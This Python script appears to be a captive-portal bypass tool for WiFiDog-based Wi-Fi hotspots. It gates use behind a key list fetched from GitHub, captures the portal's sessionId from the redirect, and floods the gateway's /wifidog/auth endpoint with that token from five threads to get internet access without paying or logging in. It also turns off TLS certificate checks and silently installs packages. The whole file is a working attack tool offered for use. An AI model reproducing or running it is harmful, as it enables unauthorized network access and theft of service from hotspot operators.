#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import re
import urllib3
import time
import threading
import logging
import random
import os
import sys
import subprocess
import importlib.util
from urllib.parse import urlparse, parse_qs, urljoin

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ===============================
# COLOR SYSTEM
# ===============================
red, bred = "\033[0;31m", "\033[1;31m"
green, bgreen = "\033[0;32m", "\033[1;32m"
yellow, byellow = "\033[0;33m", "\033[1;33m"
cyan, bcyan = "\033[0;36m", "\033[1;36m"
white, reset = "\033[0;37m", "\033[00m"

# ===============================
# KEY APPROVAL SYSTEM (GITHUB VERSION)
# ===============================
GITHUB_KEY_URL = "https://raw.githubusercontent.com/phyoewai1026-hash/my-bypass-key/main/keys.txt"
LOCAL_KEYS_FILE = os.path.expanduser("~/.turbo_approved_keys.txt")

def get_system_key():
    try:
        uid = os.geteuid()
    except AttributeError:
        uid = 1000
    try:
        username = os.getlogin()
    except:
        username = os.environ.get('USER', 'unknown')
    return f"{uid}{username}"

def fetch_authorized_keys():
    keys = []
    try:
        response = requests.get(GITHUB_KEY_URL, timeout=10, verify=False)
        if response.status_code == 200:
            for line in response.text.strip().split('\n'):
                line = line.strip()
                if "|" in line:
                    key = line.split('|')[0].strip()
                else:
                    key = line
                if key: keys.append(key)
            with open(LOCAL_KEYS_FILE, 'w') as f:
                f.write('\n'.join(keys))
            return keys
    except: pass
    if os.path.exists(LOCAL_KEYS_FILE):
        with open(LOCAL_KEYS_FILE, 'r') as f:
            return [line.strip() for line in f if line.strip()]
    return keys

def check_approval():
    os.system('clear')
    print(f"{bcyan}╔══════════════════════════════════════════════════════════════════╗")
    print(f"║                    KEY APPROVAL SYSTEM (GITHUB)                  ║")
    print(f"╚══════════════════════════════════════════════════════════════════╝{reset}")
    system_key = get_system_key()
    authorized_keys = fetch_authorized_keys()
    print(f"{white}[*] Checking System Key: {system_key}{reset}")
    if system_key in authorized_keys:
        print(f"\n{bgreen}[✓] KEY APPROVED!{reset}")
        time.sleep(1.5)
        return True
    else:
        print(f"\n{bred}❌ KEY NOT APPROVED ❌{reset}")
        print(f"{yellow}Your Key: {system_key}{reset}")
        return False

# ===============================
# FUNCTIONS
# ===============================
def display_banner():
    banner_text = f"""{bred}┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃{bgreen}      ⣠⣴⣶⣿⣿⠿⣷⣶⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⣶⣷⠿⣿⣿⣶⣦⣀⠀ {bred}┃
┃{bgreen} ⠀⠀⠀⢀⣾⣿⣿⣿⣿⣿⣿⣿⣶⣦⣬⡉⠒⠀⠀⠀⠚⢉⣥⣴⣾⣿⣿⣿⣿⣿⣿⣿⣧⠀ {bred}┃
┃{bgreen} ⠀⠀⠀⡾⠿⠛⠛⠛⠛⠿⢿⣿⣿⣿⣿⣿⣷⣄⠀⢀⣠⣾⣿⣿⣿⣿⣿⠿⠿⠛⠛⠛⠛⠿⢧ {bred}┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛{reset}"""
    print(banner_text)

def auto_install_dependencies():
    for pkg in ['requests', 'urllib3']:
        if importlib.util.find_spec(pkg) is None:
            subprocess.check_call([sys.executable, '-m', 'pip', 'install', pkg, '--quiet'])

# ===============================
# TURBO ENGINE
# ===============================
stop_event = threading.Event()

def high_speed_ping(auth_link, sid):
    session = requests.Session()
    while not stop_event.is_set():
        try:
            r = session.get(auth_link, timeout=5)
            print(f"{green}[✓]{reset} Engine Active | SID: {sid[:8]}", end="\r")
        except: pass
        time.sleep(random.uniform(0.05, 0.2))

def start_turbo_engine():
    os.system('clear')
    display_banner()
    print(f"{cyan}[*] Detecting network...{reset}")
    try:
        r = requests.get("http://connectivitycheck.gstatic.com/generate_204", allow_redirects=True, timeout=5)
        if r.url == "http://connectivitycheck.gstatic.com/generate_204":
            print(f"{green}[✓] Internet is active!{reset}")
            return
        
        portal_url = r.url
        r2 = requests.get(portal_url, verify=False, timeout=10)
        sid = parse_qs(urlparse(r2.url).query).get('sessionId', [None])[0]
        if not sid:
            sid_match = re.search(r'sessionId=([a-zA-Z0-9]+)', r2.text)
            sid = sid_match.group(1) if sid_match else None
        
        if sid:
            print(f"{green}[✓] SID Captured: {sid}{reset}")
            auth_link = f"http://192.168.110.1:2060/wifidog/auth?token={sid}"
            for _ in range(5):
                threading.Thread(target=high_speed_ping, args=(auth_link, sid), daemon=True).start()
            while True: time.sleep(10)
    except KeyboardInterrupt: raise
    except: print(f"{red}[!] Engine Error{reset}")

# ===============================
# MAIN MENU
# ===============================
def main():
    if not check_approval(): sys.exit(0)
    auto_install_dependencies()
    while True:
        os.system('clear')
        display_banner()
        print(f"\n{bgreen}[1]{reset} Start Engine\n{bred}[2]{reset} Exit")
        choice = input(f"\n{bcyan}[?]{reset} Select: ")
        if choice == '1':
            try: start_turbo_engine()
            except KeyboardInterrupt: continue
        elif choice == '2': sys.exit(0)

if __name__ == "__main__":
    try: main()
    except KeyboardInterrupt: sys.exit(0)
